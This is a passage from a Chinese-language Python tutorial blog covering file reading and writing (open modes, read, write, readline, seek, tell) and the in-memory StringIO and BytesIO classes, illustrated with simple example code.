<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
</tr>
</tbody></table>
<p><font color="#FF7F00"><strong>总结：</strong></font></p>
<ol>
<li>w 和 a 都是<font color="#FF7F00"><strong>写入不能读内容</strong></font>，前者是覆盖，后者是追加内容。</li>
<li>w+ 和 a+ 都是<font color="#FF7F00"><strong>写入且能读内容</strong></font>，前者是覆盖，后者是追加内容。</li>
</ol>
<br>

<p>以下实例将字符串写入到文件 foo.txt 中：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(f):</span><br><span class="line">	f.write( <span class="string">&quot;Python 是一个非常好的语言。\n是的，的确非常好!!\n&quot;</span> )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;文件打开失败&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">此时打开文件 foo.txt,显示如下：</span><br><span class="line">Python 是一个非常好的语言。</span><br><span class="line">是的，的确非常好!!</span><br></pre></td></tr></table></figure>


<blockquote>
<ol>
<li>第一个参数为要打开的文件名。</li>
<li>第二个参数描述文件如何使用的字符。 mode 可以是 <code>r</code> 如果文件只读, <code>w</code> 只用于写 (如果存在同名文件则将被删除), 和 <code>a</code> 用于追加文件内容; 所写的任何数据都会被自动增加到末尾. <code>r+</code> 同时用于读写。 mode 参数是可选的; <code>r</code> 将是默认值。</li>
</ol>
</blockquote>
<br>


<br>

<h4 id="1-2-f-write"><a href="#1-2-f-write" class="headerlink" title="1.2 f.write()"></a><font color="#3CB371" face="Comic sans MS">1.2 f.write()</font></h4><br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.write(string)</td>
<td align="left">将 string 写入到文件中</td>
<td align="left">返回写入的字符数</td>
</tr>
</tbody></table>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/pythonst/foo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = f.write( <span class="string">&quot;16845654316532&quot;</span> )</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT： <span class="number">14</span></span><br></pre></td></tr></table></figure>



<br>


<br>

<h4 id="1-3-f-read"><a href="#1-3-f-read" class="headerlink" title="1.3 f.read()"></a><font color="#3CB371" face="Comic sans MS">1.3 f.read()</font></h4><p>为了读取一个文件的内容，调用 <code>f.read(size)</code>, 这将读取一定数目的数据, 然后作为字符串或字节对象返回。</p>
<p>size 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回。</p>
<p><strong>注意：</strong><font color="#FF7F00"><strong><code>f.read(size)</code>必须在<code>r</code>或者<code>r+</code>模式下来读取内容。</strong></font></p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.read(size)</td>
<td align="left">文件读取指定的字节数（读取的时候文件内容的<br>一个字符按一个字节来读），如果未给定或为负则读取所有</td>
<td align="left">字符串或字节对象返回</td>
</tr>
</tbody></table>
<br>


<p>以下实例假定文件 foo.txt 已存在（上面实例中已创建）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt文件内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)  </span><br><span class="line">m = f.read(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(m,<span class="built_in">int</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(m) <span class="keyword">is</span> <span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="number">168456</span>      <span class="string">&#x27;&#x27;&#x27;把一个字符当作一个字节读取&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="literal">False</span>       <span class="string">&#x27;&#x27;&#x27;isinstance(变量,类型)判断变量的类型&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="literal">True</span>        <span class="string">&#x27;&#x27;&#x27;type()...is 也可以判断类型&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="1-4-f-close"><a href="#1-4-f-close" class="headerlink" title="1.4 f.close()"></a><font color="#3CB371" face="Comic sans MS">1.4 f.close()</font></h4><p>在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。</p>
<p>当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，<font color="#FF7F00"><strong>如果尝试再调用该文件，则会抛出异常</strong></font>。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/pythonst/foo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = f.write( <span class="string">&quot;16845654316532&quot;</span> )</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">OUTPUT： </span><br><span class="line"><span class="number">14</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;3-7.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line">ValueError: I/O operation on closed file.</span><br></pre></td></tr></table></figure>

<br>

<p>由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<font color="#FF7F00"><strong><code>try ... finally</code></strong></font>来实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)  </span><br><span class="line">	m = f.read(<span class="number">6</span>)</span><br><span class="line">	<span class="built_in">print</span>(m)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT： <span class="number">168456</span></span><br></pre></td></tr></table></figure>


<br>

<p>但是每次都这么写实在太繁琐，所以，Python引入了<font color="#FF7F00"><strong><code>with</code>语句搭配<code>as</code></strong></font>来自动帮我们调用close()方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">OUTPUT： </span><br><span class="line"><span class="number">16845654316532</span></span><br></pre></td></tr></table></figure>



<br>


<br>

<h4 id="1-5-f-readline"><a href="#1-5-f-readline" class="headerlink" title="1.5 f.readline()"></a><font color="#3CB371" face="Comic sans MS">1.5 f.readline()</font></h4><br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fileObject.readline(size)</td>
<td align="left">size为从文件中读取的字节数。<br>从文件读取整行，（包括 “\n” 字符。）</td>
<td align="left">size非负数则返回指定大小的字节数，<br>包括”\n”字符。</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"></span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取第一行 %s&quot;</span> % (line))</span><br><span class="line"></span><br><span class="line">line = fo.readline(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的字符串为: %s&quot;</span> % (line))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取第一行 www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">读取的字符串为: www.r</span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-6-f-readlines"><a href="#1-6-f-readlines" class="headerlink" title="1.6 f.readlines()"></a><font color="#3CB371" face="Comic sans MS">1.6 f.readlines()</font></h4><p>概述<br>readlines() 方法用于读取所有行(直到结束符 EOF)并返回列表，该列表可以由 Python 的 for… in … 结构进行处理。 如果碰到结束符 EOF 则返回空字符串。</p>
<p>如果碰到结束符 EOF 则返回空字符串。<br>关于EOF可参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/polar9527/article/details/38518703">文件结束符EOF</a>]</font> </p>
<br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fileObject.readlines( )</td>
<td align="left">无参数</td>
<td align="left">返回列表，包含所有的行。</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请自行区分下面两种输出方式：</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）<span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(fo.readlines())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">[<span class="string">&quot;www.runoob.com&#x27;\\n&#x27;\n&quot;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com&#x27;</span>]</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">（<span class="number">2</span>）<span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fo.readlines():                          <span class="comment">#依次读取每行  </span></span><br><span class="line">    line = line.strip()                             <span class="comment">#去掉每行头尾空白  </span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="1-7-f-tell"><a href="#1-7-f-tell" class="headerlink" title="1.7 f.tell()"></a><font color="#3CB371" face="Comic sans MS">1.7 f.tell()</font></h4><p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.tell()</td>
<td align="left">无参数</td>
<td align="left">返回文件指针的当前位置（整数）</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取当前文件位置</span></span><br><span class="line">pos = fo.tell()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;当前位置: %d&quot;</span> % (pos))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">当前位置: <span class="number">20</span></span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-8-f-seek"><a href="#1-8-f-seek" class="headerlink" title="1.8 f.seek()"></a><font color="#3CB371" face="Comic sans MS">1.8 f.seek()</font></h4><p>如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数。</p>
<p>from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾。from_what 值为默认为0，即文件开头。例如：</p>
<p>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符<br>seek(x,1) ： 表示从当前位置往后移动x个字符<br>seek(-x,2)：表示从文件的结尾往前移动x个字符</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.seek(offset[, whence])</td>
<td align="left">offset： 开始的偏移量，也就是代表需要移动偏移的字节数，<br>如果是负数表示从倒数第几位开始。<br>whence：可选，默认值为 0。给 offset 定义一个参数，<br>表示要从哪个位置开始偏移；0 代表从文件开头开始算起，<br>1 代表从当前位置开始算起，2 代表从文件末尾算起。</td>
<td align="left">无返回值</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重新设置文件读取指针到开头</span></span><br><span class="line">fo.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-9-file-对象的方法"><a href="#1-9-file-对象的方法" class="headerlink" title="1.9 file 对象的方法"></a><font color="#3CB371" face="Comic sans MS">1.9 file 对象的方法</font></h4><br>

<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法及描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.close()</a></font><br>关闭文件。关闭后文件不能再进行读写操作。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.flush()</a></font> <br>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件,<br>而不是被动的等待输出缓冲区写入。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.fileno()</a></font> <br>返回一个整型的文件描述符(file descriptor FD 整型), <br>可以用在如os模块的read方法等一些底层操作上。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.isatty()</a></font><br>如果文件连接到一个终端设备返回 True，否则返回 False。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.next()</a></font> <br>返回文件下一行。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.read([size])</a></font> <br>从文件读取指定的字节数，如果未给定或为负则读取所有。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.readline([size])</a></font> <br>读取整行，包括 “\n” 字符。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.readlines([sizeint])</a></font><br> 读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, <br>实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.seek(offset[, whence])</a></font> <br>设置文件当前位置</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.tell()</a></font> <br>返回文件当前位置。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.truncate([size])</a></font> <br>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；<br>截断之后后面的所有字符被删除，其中 Widnows 系统下的换行代表2个字符大小。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.write(str)</a></font> <br>将字符串写入文件，返回的是写入的字符长度。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.writelines(sequence)</a></font> <br>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="二-在内存读写"><a href="#二-在内存读写" class="headerlink" title="二. 在内存读写"></a><font color="#FF6347" face="Comic sans MS">二. 在内存读写</font></h3><p>可参考：<br><font color="#00B2EE">[<a href="https://blog.51cto.com/limingyu/2320441?source=dra">StringIO和BytesIO</a>]</font><br><font color="#00B2EE">[<a href="https://www.jianshu.com/p/b74a83e0f9fc">Python文件读写、StringIO和BytesIO</a>]</font></p>
<br>

<p>IO在计算机中指Input&#x2F;Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。</p>
<p>由于CPU和内存的速度远远高于外设的速度，所以，在IO编程中，就存在速度严重不匹配的问题。举个例子来说，比如要把100M的数据写入磁盘，CPU输出100M的数据只需要0.01秒，可是磁盘要接收这100M数据可能需要10秒，怎么办呢？有两种办法：</p>
<p>第一种是CPU等着，也就是程序暂停执行后续代码，等100M的数据在10秒后写入磁盘，再接着往下执行，这种模式称为同步IO；</p>
<p>另一种方法是CPU不等待，只是告诉磁盘，“您老慢慢写，不着急，我接着干别的事去了”，于是，后续代码可以立刻接着执行，这种模式称为异步IO。</p>
<p>很明显，使用异步IO来编写程序性能会远远高于同步IO，但是异步IO的缺点是编程模型复杂。</p>
<p>操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用，Python也不例外。我们后面会详细讨论Python的IO编程接口。</p>
<p>注意，本章的IO编程都是同步模式，异步IO由于复杂度太高，后续涉及到服务器端程序开发时我们再讨论。</p>
<br>

<p>就单独说一下Python的input()和print()：</p>
<p><strong>input()：</strong> 在控制台把数据输入到内存中，然后从内存中把数据以字符串形式返回给调用处；</p>
<p><strong>print()：</strong> 从内存中输出括号里的相对应的信息。</p>
<br>

<h4 id="2-1-StringIO"><a href="#2-1-StringIO" class="headerlink" title="2.1 StringIO"></a><font color="#3CB371" face="Comic sans MS">2.1 StringIO</font></h4><p>很多时候，数据读写不一定是文件，也可以在<font color="#FF7F00"><strong>内存中</strong></font>读写。</p>
<p>StringIO是IO模块中的类，所以使用的时候要引用模块： <code>from io import StringIO</code></p>
<p>StringIO顾名思义就是<font color="#FF7F00"><strong>在内存中读写str</strong></font>。</p>
<ul>
<li><p>内存中，开辟的一个文本模式的buffer,可以像文件对象一样操作它；</p>
</li>
<li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p>
</li>
<li><p>当close方法被调用的时候，这个buffer会被释放；</p>
</li>
</ul>
<p><strong>好处：</strong></p>
<p>  一般来说，磁盘的操作比内存的操作要慢得多；内存足够的情况下，一般的优化思路是少落地，减少磁盘IO的过程，可以大大提高程序的运行效率。</p>
<blockquote>
<p><strong>使用到的方法：</strong></p>
</blockquote>
<ul>
<li><font color="#FF7F00"><strong>StringIO()：</strong></font>创建一个StringIO对象，类似文件的<code>open()</code>方法，创建的这个对象要赋值给一个变量；</li>
<li><font color="#FF7F00"><strong>f.write(‘String’)：</strong></font>将字符String写入到内存，返回写入的字节数（一个字符按一个字节算）；</li>
<li><font color="#FF7F00"><strong>f.getvalue(size)：</strong></font>从内存中读取size个字节（一个字符按一个字节算），若无参数则读取全部字节；</li>
<li><font color="#FF7F00"><strong>f.readable()：</strong></font>判断IO是否可读；</li>
<li><font color="#FF7F00"><strong>f.writable()：</strong></font>判断IO是否可写；</li>
<li><font color="#FF7F00"><strong>f.seekable()：</strong></font>指针是否可操作。</li>
</ul>
<p>要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="comment">#内存中构建</span></span><br><span class="line">f = StringIO()<span class="comment">#像文件对象一样操作  这里一定要赋值给一个变量!</span></span><br><span class="line"><span class="built_in">print</span>(f.readable(), f.writable(), f.seekable())</span><br><span class="line">f.write(<span class="string">&quot;Hello\nPython&quot;</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(f.readline())</span><br><span class="line"><span class="built_in">print</span>(f.getvalue())<span class="comment">#无视指针，输出全部内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> <span class="literal">True</span></span><br><span class="line">Hello</span><br><span class="line"></span><br><span class="line">Hello</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="2-2-BytesIO"><a href="#2-2-BytesIO" class="headerlink" title="2.2 BytesIO"></a><font color="#3CB371" face="Comic sans MS">2.2 BytesIO</font></h4><p>StringIO操作的只能是str，如果要操作<font color="#FF7F00"><strong>二进制数据</strong></font>，就需要使用BytesIO。</p>
<p>BytesIO是IO模块中的类，所以使用的时候要引用模块：<code>from io import BytesIO</code></p>
<ul>
<li><p>内存中，开辟的一个二进制模式的buffer，可以像文件对象一样操作它；</p>
</li>
<li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p>
</li>
<li><p>当close方法被调用的时候，这个buffer会被释放；</p>
</li>
<li><p>使用到的方法和StringIO一样，不过一个读的是字符一个读的是字节。</p>
</li>
</ul>
<br>

<p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">ff = BytesIO()</span><br><span class="line"><span class="built_in">print</span>(ff.readable(), ff.writable(), ff.seekable())</span><br><span class="line">ff.write(<span class="string">b&#x27;Hello\nPython&#x27;</span>)</span><br><span class="line">ff.write(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ff.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(ff.readline())</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(ff.getvalue())</span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> <span class="literal">True</span></span><br><span class="line"><span class="string">b&#x27;Hello\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;Hello\nPython\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>


<br>

<p><strong>file-like对象</strong></p>
<p>类文件对象，可以像文件对象一样操作；</p>
<p>socket对象，输入输出对象(stdin、stdout)都是类文件对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"></span><br><span class="line">f = stdout</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(f))</span><br><span class="line">f.write(<span class="string">&quot;90data.net&quot;</span>)</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_io</span>.<span class="title">TextIOWrapper</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">90<span class="title">data</span>.<span class="title">net</span></span></span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="三-操作目录"><a href="#三-操作目录" class="headerlink" title="三. 操作目录"></a><font color="#FF6347" face="Comic sans MS">三. 操作目录</font></h3><p>如果我们要操作文件、目录，可以在命令行下面输入操作系统提供的各种命令来完成。比如dir、cp等命令。</p>
<p>如果要在Python程序中执行这些目录和文件的操作怎么办？其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的<font color="#FF7F00"><strong>os模块</strong></font>也可以直接<font color="#FF7F00"><strong>调用操作系统提供的接口函数</strong></font>。</p>
<p><font face="Comic sans MS"><font color="#00B2EE">具体方法：[<a href="http://www.runoob.com/python3/python3-os-file-methods.html">Python3 OS 文件&#x2F;目录方法</a>]</font><br></font></p>
<p>打开Python交互式命令行，我们来看看如何使用os模块的基本功能：</p>
